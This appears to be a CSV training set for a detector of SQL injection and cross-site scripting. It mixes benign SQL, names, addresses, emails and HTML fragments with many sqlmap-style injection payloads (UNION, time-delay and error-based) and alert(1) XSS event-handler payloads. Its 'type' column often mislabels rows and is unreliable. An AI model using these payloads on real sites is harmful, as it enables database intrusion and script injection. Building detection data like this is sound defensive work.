Text,Label,type
1'  )   and 2006  =  2006,1,sql
"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,2,xss
SELECT safe ( s )  FROM over UNION ALL,0,sql
17463,0,sql
<svg><pre onload=alert(1)></pre>,2,xss
"  SELECT * FROM machine WHERE fun NOT IN  ( 'moment', 'condition', 'earlier' )  ",0,sql
SELECT * FROM very WHERE fresh  BETWEEN 10 AND 20,0,sql
"  SELECT typical,look,shells FROM below LEFT JOIN Orders ON border.moodID =  accurate.although ORDER BY studying.purpose",0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '",1,sql
SELECT AVG ( daughter )  FROM increase  SELECT SUM ( shall ) ,0,xss
<select onfocusout=alert(1) id=x></select><input autofocus>,2,xss
"<ul><li><a href=""#CITEREFWeizenbaum1976"">Weizenbaum 1976 </a> </li>",0,xss
admin' or ',1,sql
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",1,sql
pfeilsch,0,sql
"<form oncontextmenu=""alert(1)"">test</form>",2,xss
3.24363E+15,0,sql
guilbert_silver@maquillajeparalabios.dj,0,sql
"<details draggable=""true"" ondragenter=""alert(1)"">test</details>",2,xss
<datalist onpointerleave=alert(1)>XSS</datalist>,2,xss
cotner,0,sql
SELECT breathing ( s )  FROM blood UNION,0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=73"" title=""Edit section: AI textbooks"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,sql
"calle andres mellado, 83, 12-d",0,sql
SELECT * FROM laid ORDER BY successful,0,sql
<small id=x tabindex=1 onfocusin=alert(1)></small>,2,xss
SELECT AVG ( earn ) FROM goose SELECT SUM ( stick ) ,0,sql
SELECT * FROM underline 3,0,sql
"1%"" and 7533  =  7533 and ""%""  =  """,1,sql
<title id=x tabindex=1 onfocus=alert(1)></title>,2,xss
"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,xss
"1'+  (  select 'vkis' where 3712  =  3712   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   +'",1,sql
SELECT COUNT ( market ) FROM grew,0,sql
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
"<p>The relationship between automation and employment is complicated. While automation eliminates old jobs, it also creates new jobs through micro-economic and macro-economic effects.<sup id=""cite_ref-384"" class=""reference""><a href=""#cite_note-384"">&#91;373&#93; </a> </sup> Unlike previous waves of automation, many middle-class jobs may be eliminated by artificial intelligence; <i><a href=""/wiki/The_Economist"" title=""The Economist"">The Economist </a> </i> states that ""the worry that AI could do to white-collar jobs what steam power did to blue-collar ones during the Industrial Revolution"" is ""worth taking seriously"".<sup id=""cite_ref-385"" class=""reference""><a href=""#cite_note-385"">&#91;374&#93; </a> </sup> Subjective estimates of the risk vary widely; for example, Michael Osborne and <a href=""/wiki/Carl_Benedikt_Frey"" title=""Carl Benedikt Frey"">Carl Benedikt Frey </a> estimate 47% of U.S. jobs are at ""high risk"" of potential automation, while an OECD report classifies only 9% of U.S. jobs as ""high risk"".<sup id=""cite_ref-386"" class=""reference""><a href=""#cite_note-386"">&#91;375&#93; </a> </sup><sup id=""cite_ref-387"" class=""reference""><a href=""#cite_note-387"">&#91;376&#93; </a> </sup><sup id=""cite_ref-388"" class=""reference""><a href=""#cite_note-388"">&#91;377&#93; </a> </sup> Jobs at extreme risk range from paralegals to fast food cooks, while job demand is likely to increase for care-related professions ranging from personal healthcare to the clergy.<sup id=""cite_ref-389"" class=""reference""><a href=""#cite_note-389"">&#91;378&#93; </a> </sup> Author <a href=""/wiki/Martin_Ford_(author)"" title=""Martin Ford (author)"">Martin Ford </a> and others go further and argue that many jobs are routine, repetitive and (to an AI) predictable; Ford warns that these jobs may be automated in the next couple of decades, and that many of the new jobs may not be ""accessible to people with average capability"", even with retraining. Economists point out that in the past technology has tended to increase rather than reduce total employment, but acknowledge that ""we're in uncharted territory"" with AI.<sup id=""cite_ref-guardian_jobs_debate_24-1"" class=""reference""><a href=""#cite_note-guardian_jobs_debate-24"">&#91;24&#93; </a> </sup>",0,xss
33560,0,sql
"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",1,sql
SELECT * FROM left  WHERE please NOT LIKE '[customs]%',0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,sql
"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,1,sql
1'  )   where 2120  =  2120,1,xss
	 </span> </h3>,0,xss
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
SELECT AVG ( development ) FROM organized SELECT SUM ( mostly ) ,0,xss
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,2,xss
1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,xss
"<del onmousedown=""alert(1)"">test</del>",2,xss
SELECT TOP 50 PERCENT * FROM settle SELECT * FROM blank FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM somehow,0,sql
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0,sql
8016,0,sql
"1""   )    )     )  ",1,sql
"plaa tarent, 117, 2-h",0,sql
SELECT COUNT ( languageID ) FROM church,0,sql
"-1917""  )   or 8571  =  8571--",1,sql
entwistle_ruetting@comonuevo.ro,0,xss
"        <script src=""_static/language_data.js""></script>",0,xss
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,2,xss
SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;,0,sql
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",1,sql
cu2tre8a,0,xss
"<li><cite id=""CITEREFNilsson1998"" class=""citation book""><a href=""/wiki/Nils_Nilsson_(researcher)"" class=""mw-redirect"" title=""Nils Nilsson (researcher)"">Nilsson, Nils </a> (1998). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/artificialintell0000nils""><i>Artificial Intelligence: A New Synthesis </i> </a> ",0,xss
"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
"<i onbeforepaste=""alert(1)"" contenteditable>test</i>",2,xss
"<li><cite class=""citation journal"">Serenko, Alexander (2010). <a rel=""nofollow"" class=""external text"" href=""http://www.aserenko.com/papers/JOI_Serenko_AI_Journal_Ranking_Published.pdf"">""The development of an AI journal ranking based on the revealed preference approach"" </a> <span class=""cs1-format"">(PDF) ",0,xss
SELECT COUNT ( cloud ) FROM child,0,xss
"<li><a href=""/wiki/Bertrand_Russell"" title=""Bertrand Russell"">Bertrand Russell </a> </li>",0,xss
1  )   and   (  7557  =  1711  )  *1711 and   (  5157  =  5157,1,sql
moharra jodra,0,sql
"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT * FROM either WHERE they = 'cat'  AND City = 'ahead',0,xss
<table onpointerleave=alert(1)>XSS</table>,2,xss
"-5066'   )    )    union all select 9689,9689,9689,9689#",1,sql
 </li>,0,xss
1 where 3956  =  3956,1,sql
 </li>,0,xss
"1""  )   as cfed where 8220  =  8220 union all select null,null,null,null,null,null,null,null,null#",1,xss
"<nextid onbeforecut=""alert(1)"" contenteditable>test</nextid>",2,xss
"<style>@keyframes slidein {}</style><strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strike>",2,xss
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",1,sql
longhurst-street1@drae2.pa,0,sql
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,2,xss
anguita,0,sql
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,sql
"<noframes onbeforecut=""alert(1)"" contenteditable>test</noframes>",2,xss
ulldemolins,0,sql
"<table draggable=""true"" ondrag=""alert(1)"">test</table>",2,xss
25214,0,sql
"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1,sql
"<input oncopy=alert(1) value=""XSS"" autofocus>",2,xss
alvarez 35,0,sql
1'  )   as mara where 7164  =  7164,1,sql
SELECT * FROM adult WHERE event BETWEEN '1996-07-01' AND '1996-07-31',0,sql
<svg><image href=validimage.png onload=alert(1)>,2,xss
"<dialog onmouseover=""alert(1)"">test</dialog>",2,xss
"	 </span> <span class=""reference-text""><a href=""/wiki/Yann_LeCun"" title=""Yann LeCun"">Yann LeCun </a> (2016). Slides on Deep Learning <a rel=""nofollow"" class=""external text"" href=""https://indico.cern.ch/event/510372/"">Online </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160423021403/https://indico.cern.ch/event/510372/"">Archived </a> 23 April 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> ",0,xss
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" ontransitionend=alert(1)></footer>",2,xss
SELECT * FROM hour,0,xss
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ozef'  =  'ozef",1,sql
SELECT * FROM area WHERE easily = 'wash',0,sql
SELECT * FROM tales,0,xss
"<li><cite id=""CITEREFDreyfusDreyfus1986"" class=""citation book""><a href=""/wiki/Hubert_Dreyfus"" title=""Hubert Dreyfus"">Dreyfus, Hubert </a>; Dreyfus, Stuart (1986). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/mindovermachinep00drey""><i>Mind over Machine: The Power of Human Intuition and Expertise in the Era of the Computer </i> </a>. Oxford, UK: Blackwell. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-02-908060-3"" title=""Special:BookSources/978-0-02-908060-3""><bdi>978-0-02-908060-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Mind+over+Machine%3A+The+Power+of+Human+Intuition+and+Expertise+in+the+Era+of+the+Computer&amp;rft.place=Oxford%2C+UK&amp;rft.pub=Blackwell&amp;rft.date=1986&amp;rft.isbn=978-0-02-908060-3&amp;rft.aulast=Dreyfus&amp;rft.aufirst=Hubert&amp;rft.au=Dreyfus%2C+Stuart&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fmindovermachinep00drey&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
SELECT Count ( * )  AS fairly,0,sql
alm.ora,0,sql
  </div>,0,xss
^',1,sql
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1,sql
"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,xss
"<template oncopy=""alert(1)"" contenteditable>test</template>",2,xss
"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",1,sql
"-8203""  )   union all select 6394,6394,6394,6394,6394--",1,sql
lotfaga,0,sql
SELECT Count ( * )  AS year,0,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c83ee379f0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
35807418y,0,sql
select case when 3995  =  8680 then 1 else null end--,1,sql
"<dl onmouseup=""alert(1)"">test</dl>",2,xss
5ictoriosamente,0,xss
SELECT heading,0,sql
SELECT AVG ( quickly )  FROM master  SELECT SUM ( vowel ) ,0,sql
"calle mercurio, 19,",0,sql
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,sql
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1,xss
"  SELECT Orders.finestrID, Employees.ride, Employees.partly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.partID ORDER BY Orders.keyID",0,xss
"   SELECT suddenly,bring,distance,hello,addition     (  (  which JOIN lungs ON carried.parent =  shake.curious )   INNER JOIN hadON Orders.baseball =  dirt.moodID ) ",0,sql
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1,sql
"-6389"" union all select 2355,2355,2355,2355,2355--",1,xss
fla,0,sql
SELECT * FROM letter WHERE flight = 'underline'  AND  ( dance = 'basket' OR appearance = 'magnet' ) ,0,sql
g5adae3a,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></optgroup>",2,xss
SELECT form ( s )  FROM grown,0,sql
"<xmp onmousedown=""alert(1)"">test</xmp>",2,xss
t0na5t44la,0,xss
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1,sql
4014,0,sql
for26same8te,0,sql
"-3391' union all select 2024,2024--",1,xss
"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",1,xss
"<li><a href=""/wiki/Computer_data_storage"" title=""Computer data storage"">Information storage systems </a> </li>",0,xss
"1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1,sql
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",1,sql
<input type=image src=validimage.png onload=alert(1)>,2,xss
"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>",2,xss
"<svg onkeydown=""alert(1)"" contenteditable>test</svg>",2,xss
"   SELECT Employees.type, COUNT ( Orders.locationID )  AS comeFROM    ( OrdersINNER JOIN running ON Orders.talesID  =  Employees.herdID ) ",0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53820 )  ORDER BY meta_id ASC",0,sql
"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",2,xss
"1' union all select null,null,null#",1,sql
"<li id=""cite_note-FOOTNOTERussellNorvig20091-289""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-FOOTNOTERussellNorvig20091_289-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-FOOTNOTERussellNorvig20091_289-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
3.89386E+15,0,xss
SELECT COUNT ( those ) FROM provide,0,sql
	 </span>,0,xss
"<script onkeypress=""alert(1)"" contenteditable>test</script>",2,xss
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,xss
SELECT * FROM task WHERE meal = 'kill'  OR southern = 'enjoy',0,sql
<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>,2,xss
"1%'  )   and elt  (  4249  =  4249,7259  )   and   (  '%'  =  '",1,sql
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down,0,sql
 </li>,0,xss
"	 </span> <span class=""toctext"">See also ",0,xss
" select sleep  (  5  )   and    (    (     (  ""%""  =  """,1,sql
SELECT * FROM industrial  WHERE flag = queen,0,xss
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg,1,xss
octagonal,0,sql
if  (  5316  =  4416  )   select 5316 else drop function vtve--,1,xss
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/tutorial.html"">Scrapy Tutorial</a></li>",0,xss
SELECT Count ( * )  AS future,0,sql
DELETE FROM slight WHERE central = 'produce',0,sql
"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
SELECT * FROM press WHERE break = 'map' FETCH FIRST 3 ROWS ONLY,0,sql
	 </span>,0,xss
"  SELECT heartID AS ID, dawn AS behavior FROM opposite",0,sql
1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,1,sql
SELECT * FROM pond FETCH FIRST 3 ROWS ONLY,0,sql
DELETE FROM because WHERE deeply = 'quickly',0,xss
"   SELECT COUNT ( everywhere ) , smoke FROM total BY degree",0,xss
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",2,xss
SELECT * FROM enjoy WHERE studying NOT LIKE '[bell]%',0,sql
"<q ondblclick=""alert(1)"">test</q>",2,xss
SELECT * FROM else FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,sql
" SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN  Customers ON Orders.CustomerID  =  Customers.CustomerID;",0,sql
 </li>,0,xss
DELETE FROM rhyme,0,sql
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1,sql
SELECT city ( s )  FROM involved FULL OUTER JOIN,0,sql
	 </span>,0,xss
"1%""   )    )   ",1,sql
"1'   )    )    as fwxq where 9935  =  9935 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,xss
	 </span>,0,xss
vitacco,0,xss
SELECT slide ( s )  FROM see,0,sql
1   )    )    as efjb where 4642  =  4642 order by 1#,1,sql
lzaro,0,xss
SELECT COUNT ( DISTINCT stand )  FROM parent,0,sql
"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
SELECT * FROM future FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1  )   as ewnv where 3393  =  3393 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
"	 </span> <span class=""toctext"">Embodied intelligence ",0,xss
"<dt><a class=""reference internal"" href=""topics/api.html""><span class=""doc"">Core API",0,xss
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Voice+of+America&amp;rft.atitle=Ethical+AI+Learns+Human+Rights+Framework&amp;rft_id=https%3A%2F%2Fwww.voanews.com%2Fepisode%2Fethical-ai-learns-human-rights-framework-4087171&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
lucila2,0,xss
"<li id=""cite_note-AI_widely_used-25""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-AI_widely_used_25-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-AI_widely_used_25-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
1'  )   as fkpn where 1100  =  1100,1,sql
"<li id=""cite_note-57""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-57"">^ </a> </b> ",0,xss
perpi izurrieta,0,sql
c28a3iz8,0,sql
"   SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet",0,sql
"  SELECT general,ourselves,farther FROM vowel LEFT JOIN Orders ON lift.continuedID =  cattle.trip ORDER BY bent.respect",0,xss
"1""   )    )     )   or sleep  (  5  )  #",1,sql
schiavelli@buscadordevideos.mk,0,sql
91553356q,0,sql
SELECT * FROM bow WHERE practical NOT LIKE 'usually%',0,sql
"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1,sql
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",1,xss
SELECT SIGN ( -12 ) ;,0,sql
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>,2,xss
"1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
"SELECT * FROM announced WHERE health BETWEEN ""yourself"" AND    ""that""",0,sql
3.62829E+15,0,sql
"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1,sql
"<output onbeforecut=""alert(1)"" contenteditable>test</output>",2,xss
SELECT COUNT ( shine )  FROM poet,0,sql
<keygen autofocus onfocusin=alert(1)>,2,xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'fpaf'  =  'fpaf",1,xss
"<style>@keyframes x{}</style><ol style=""animation-name:x"" onanimationend=""alert(1)""></ol>",2,xss
"1"" union all select null,null,null,null,null,null,null--",1,sql
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,2,xss
cazallas caminal,0,sql
SELECT COUNT ( incomeID ) FROM introduced,0,sql
SELECT * FROM told FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,sql
vargueo,0,sql
"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",1,sql
"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",1,sql
1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||',1,sql
SELECT anywhere ( s )  FROM youth SELECT got ( s ) ,0,sql
-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--,1,sql
SELECT Count ( * )  AS bite,0,sql
1 and sleep  (  5  ) ,1,sql
	 </span> </a> </li>,0,xss
42141,0,sql
SELECT * FROM birthday ORDER BY court DESC,0,sql
SELECT * FROM stepped WHERE mud BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT century ( s )  FROM adventure,0,sql
fraser,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Galvan, Jill (1 January 1997). ""Entering the Posthuman Collective in Philip K. Dick's ""Do Androids Dream of Electric Sheep?<span class=""cs1-kern-right"">"" ",0,xss
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",2,xss
"c/ corint, 13 11?a",0,sql
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<optgroup onmousedown=""alert(1)"">test</optgroup>",2,xss
ferreruela,0,sql
"<!DOCTYPE html><html class=""no-js"" lang=""en"" > ",0,xss
SELECT * FROM paint WHERE century BETWEEN 'change' AND 'selection',0,xss
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",2,xss
"SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",2,xss
"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",1,sql
SELECT TOP 3 * FROM reader WHERE factory = 'earth',0,sql
"1""  )   as ikdo where 4128  =  4128",1,xss
"<track oncontextmenu=""alert(1)"">test</track>",2,xss
SELECT * FROM office  WHERE equator NOT LIKE '[still]%',0,xss
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf",1,sql
"<a href=""/wiki/Joseph_Weizenbaum"" title=""Joseph Weizenbaum"">Joseph Weizenbaum </a>'s critique of AI:",0,xss
